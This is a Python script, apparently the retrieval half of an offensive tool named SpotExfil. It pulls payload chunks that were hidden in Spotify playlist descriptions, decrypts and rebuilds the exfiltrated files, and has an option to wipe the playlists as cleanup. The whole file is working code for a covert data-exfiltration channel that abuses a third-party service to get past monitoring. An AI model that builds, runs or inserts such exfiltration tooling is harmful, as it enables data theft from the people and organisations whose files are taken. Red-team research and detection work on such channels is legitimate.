#!/usr/bin/env python3
"""SpotExfil Retrieve - Retrieve exfiltrated data from Spotify playlists.

Reads payload chunks from playlist descriptions, decodes, decrypts,
and decompresses them back to the original file.

Credentials can be provided via environment variables or
~/.spotexfil.conf config file.
"""

import argparse
import sys

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'python'))
from spotexfil import crypto as encoding  # noqa: E402
from spotexfil import transport as spot  # noqa: E402

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def parse_args():
    """Parse command-line arguments.

    Returns:
        argparse.Namespace with parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description='SpotExfil: retrieve data from Spotify playlists'
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '-r', '--receive', action='store_true',
        help='Retrieve and decode the payload'
    )
    group.add_argument(
        '--clean', action='store_true',
        help='Remove all payload playlists and exit'
    )
    parser.add_argument(
        '-k', '--key', default=None,
        help='Decryption passphrase (must match encryption key)'
    )
    parser.add_argument(
        '-o', '--output', default=None,
        help='Output file path (default: print to stdout or payload.bin)'
    )
    return parser.parse_args()


def main():
    """Main entry point for the retrieval client."""
    args = parse_args()

    spotify = spot.Spot()

    if args.clean:
        spotify.clear_data()
        return

    cipher = encoding.Subcipher(spotify, encryption_key=args.key)

    results = spotify.retrieve_playlists()
    decoded = cipher.decode_payload(results)

    if not decoded:
        print("[!] No data decoded")
        sys.exit(1)

    output_path = args.output

    try:
        # Try to decode as text
        text = decoded.decode('utf-8')
        if output_path:
            with open(output_path, 'w') as f:
                f.write(text)
            print(f"[*] Text payload saved to {output_path}")
        else:
            print(text)
    except UnicodeDecodeError:
        # Binary payload
        output_path = output_path or "payload.bin"
        with open(output_path, 'wb') as f:
            f.write(decoded)
        print(f"[*] Binary payload saved to {output_path}")


if __name__ == "__main__":
    main()
